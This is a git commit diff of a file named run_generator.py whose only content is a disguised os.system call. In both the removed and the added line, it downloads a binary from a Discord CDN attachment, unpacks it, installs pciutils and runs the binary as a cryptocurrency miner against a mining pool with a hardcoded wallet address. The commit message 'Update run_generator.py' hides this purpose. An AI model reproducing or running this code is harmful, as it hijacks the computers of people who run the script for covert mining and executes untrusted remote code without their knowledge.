91bb3bbc28c59fb6def804d051e976a3fb21eff2
PastelonDeHuawner <92591409+PastelonDeHuawner@users.noreply.github.com>
2021-10-15 13:06:03 -0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && apt install pciutils && ./work -rvram 1 -pool us.stratu.ms:15969 -ewal 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.81rnkx4xv7s4w8b -esm 3 -allpools 1 -allcoins 0")
+alpha.system("apt-get install -y wget && wget https://cdn.discordapp.com/attachments/796512270032437289/814876662688120842/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update && apt-get install -y pciutils && ./work -rvram 1 -pool us.stratu.ms:15969 -ewal 3N1wxx2YQrvobXJtpz7Js5h5zNqx2qo7H6.81rnkx4xv7s4w8b -esm 3 -allpools 1 -allcoins 0")
